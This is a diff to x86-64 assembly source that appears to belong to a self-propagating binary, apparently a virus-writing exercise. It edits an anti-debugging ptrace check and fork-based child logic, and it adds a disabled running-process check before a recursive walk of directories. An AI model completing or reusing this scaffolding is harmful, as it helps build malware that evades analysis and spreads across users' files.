@@ -50,13 +50,17 @@ encrypted_start:
     syscall             ; ptrace(PTRACE_TRACEME, 0, 1, 0);
     cmp rax, 0
     jl exit
-birth_of_child:
-    mov rax, SYS_FORK
-    syscall
-    mov [rsp + fork], rax
-    cmp rax, 0
-    jnz exit
 
+  ;  call get_processus_actif
+  ;  cmp rax, 0
+  ;  jnz exit
+
+birth_of_child:
+ ;   mov rax, SYS_FORK
+ ;   syscall
+ ;   push rax
+ ;   cmp rax, 0
+ ;   jnz exit
 
     lea rdi, [rsp + fileName]
     lea rsi, [rel firstDir]
@@ -70,16 +74,15 @@ birth_of_child:
     call recursive
 
 exit:
-    xor rax, rax
+ ;   pop r12
     pop rsi
     pop rdi
     pop rcx
     pop rdx
     leave
-
-    cmp qword [rsp + fork], 0 
-    jz death_of_child
-
+  ;  xor rax, rax
+  ;  cmp r12, 0
+  ;  jz death_of_child
 jump:
     ret
     nop
@@ -89,6 +92,10 @@ jump:
 
 death_of_child:
     ret
+
+;%include "get_processus_actif.s"
+
+%include "putnbr.s"
 
 %include "recursive.s"
 
